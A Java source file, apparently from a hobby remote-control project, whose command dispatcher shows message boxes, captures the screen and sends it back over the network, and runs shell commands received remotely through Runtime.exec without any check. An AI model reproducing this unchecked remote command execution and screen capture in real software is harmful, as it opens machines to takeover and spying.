/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package Network;

//import com.sun.image.codec.jpeg.JPEGCodec;
//import com.sun.image.codec.jpeg.JPEGImageEncoder;
import Network.RequestHeader;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.awt.image.DataBufferByte;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

/**
 *
 * @author mathew
 */
public class Tools {
    
    
    public static byte[] imageToBytes(BufferedImage image) throws IOException{
        Print.print("Converting image to bytes");
       byte[] imageInByte;

			ByteArrayOutputStream baos = new ByteArrayOutputStream();
			ImageIO.write(image, "jpg", baos);
			baos.flush();
			imageInByte = baos.toByteArray();
			baos.close();   
    return imageInByte;
    }
    
    
    
    public static void parseCommand(RequestHeader head){
        Print.print("Parsing Command \""+head.PARAMETERS[0]+"\"");
        String utility = head.PARAMETERS[0].toLowerCase();
        switch(utility){
            case "displaymsg":
                try{
                    Print.print("Displaying message : "+head.PARAMETERS[1]+" : "+head.PARAMETERS[2]);
                    new Thread(new Runnable(){public void run(){
                        JOptionPane.showMessageDialog(null, head.PARAMETERS[1], head.PARAMETERS[2], JOptionPane.INFORMATION_MESSAGE);
                        
                        
                    }}).start();
                    Network.sendSuccessfulResponce(head, null);
                    
                } catch(Exception e){
                    Network.sendFailedResponce(head, null);
                    
                }
                
                
                break;
                
            case "screenshot":
                try{
                Robot r = new Robot();
                Rectangle Rect = new Rectangle();
                if(head.PARAMETERS[1].equalsIgnoreCase("fullscreen")){
                    Rect.setSize(Toolkit.getDefaultToolkit().getScreenSize());
                    
                    
                    Print.print("Taking a screen shot of the whole screen");
                }
                else{
                    Print.print("Taking screen shot using bounds\n "+" : "+Integer.parseInt(head.PARAMETERS[1])+" : "+ Integer.parseInt(head.PARAMETERS[2])+" : "+
                            Integer.parseInt(head.PARAMETERS[3])+" : "+ Integer.parseInt(head.PARAMETERS[4]));
                    Rect.setBounds(Integer.parseInt(head.PARAMETERS[1]), Integer.parseInt(head.PARAMETERS[2]), 
                            Integer.parseInt(head.PARAMETERS[3]), Integer.parseInt(head.PARAMETERS[4]));
                }
                
                Object[] returnImage = new Object[1];
                BufferedImage capturedimage= r.createScreenCapture(Rect);
                Print.print("Screen Captured");
                returnImage[0] = Tools.imageToBytes(capturedimage);
                    
                    
                Network.sendSuccessfulResponce(head, returnImage);
                    Print.print("Picture sent back!");
                
                } catch(Exception e){
                    Print.print("Dah, failed, sending appropiate responce.");
                    Print.print("Reason for error: "+e);
                Network.sendFailedResponce(head, null);
                    
                }
                break;
                
                
                
            case "shell":
                try{
               Runtime.getRuntime().exec(head.PARAMETERS[1]);
                        
                Network.sendSuccessfulResponce(head, null);
                      
                        }
                
                catch(Exception e){
                    
                    Network.sendFailedResponce(head, null);
                }
                break;
            
            
            
            
        }
        
        
        
        
        
    }
    
    public static void main(String[] args){
        String[] command = {"shell","explorer.exe"};
        Tools.parseCommand(new RequestHeader(null, 1, command));
    }
}
